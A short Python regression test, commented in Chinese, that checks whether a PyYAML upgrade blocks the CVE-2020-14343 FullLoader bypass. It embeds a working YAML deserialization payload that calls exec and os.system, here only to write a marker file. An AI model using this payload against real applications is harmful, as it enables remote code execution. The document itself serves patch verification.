"""升级前/后各打一次：模拟攻击者上传的 YAML 配置文件（CVE-2020-14343 FullLoader 绕过）。
不做任何实际破坏，只让 payload 写一个标记文件；能写出来就说明代码执行成功。"""
import os
import sys

import yaml

MARKER = os.path.join(os.path.dirname(os.path.abspath(__file__)), "PWNED")
if os.path.exists(MARKER):
    os.remove(MARKER)

# 攻击载荷等价于用户上传的 .yaml，命令只是写一个无害的标记文件
payload = (
    "!!python/object/new:type\n"
    '  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]\n'
    "  listitems: \"__import__('os').system('echo pwned > %s')\"\n" % MARKER.replace("\\", "/")
)

# 和应用里一模一样的解析方式
try:
    yaml.load(payload, Loader=yaml.FullLoader)
except Exception as exc:  # 修复版会在构造阶段直接抛错
    print("BLOCKED", type(exc).__name__)
    sys.exit(0)

print("EXPLOITED" if os.path.exists(MARKER) else "BLOCKED")
